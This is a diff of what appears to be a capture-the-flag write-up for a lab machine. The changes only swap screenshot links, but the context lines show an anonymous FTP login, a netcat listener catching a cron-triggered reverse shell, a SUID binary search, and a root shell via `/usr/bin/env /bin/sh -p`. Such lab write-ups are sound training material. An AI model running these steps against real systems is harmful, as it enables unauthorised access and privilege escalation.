@@ -40,7 +40,7 @@ Four ports came back:
 
 I also ran the target through the port scanner I've been building myself (`main.py`, a lightweight nmap/zenmap-style tool in Python) to cross-check the nmap results against my own code:
 
-<img width="1200" height="700" alt="Custom scanner output confirming open ports" src="assets/anonymous-custom-scanner.png" />
+<img width="1906" height="1061" alt="Screenshot 2025-10-28 231821" src="https://github.com/user-attachments/assets/7cdcf81a-d036-4a29-928f-2a84e2e41cc4" />
 
 ```text
 Network Scanner v1.0
@@ -73,8 +73,7 @@ Matched nmap's findings exactly — good validation for the tool. Small attack s
 ```bash
 ftp 10.10.40.150
 ```
-
-<img width="900" height="500" alt="Anonymous FTP login and directory listing" src="assets/anonymous-ftp-login.png" />
+<img width="922" height="512" alt="image" src="https://github.com/user-attachments/assets/3cccd8de-6786-420e-bfd7-8f8081886f34" />
 
 ```text
 Connected to 10.10.40.150.
@@ -129,7 +128,7 @@ Set up a listener and waited for the cron job to fire:
 nc -nlvp 1234
 ```
 
-<img width="1900" height="500" alt="Reverse shell caught, landing as namelessone" src="assets/anonymous-reverse-shell.png" />
+<img width="1915" height="993" alt="image" src="https://github.com/user-attachments/assets/883c369c-2f39-43c1-a774-2459672ebb94" />
 
 ```text
 listening on [any] 1234 ...
@@ -182,7 +181,7 @@ find / -user root -perm -u=s 2>/dev/null
 /usr/bin/env /bin/sh -p
 ```
 
-<img width="700" height="300" alt="Root shell via SUID env, root flag captured" src="assets/anonymous-root-shell.png" />
+<img width="1132" height="828" alt="image" src="https://github.com/user-attachments/assets/44103325-1ba8-44ff-86a3-6253b7875050" />
 
 ```text
 $ /usr/bin/env /bin/sh -p
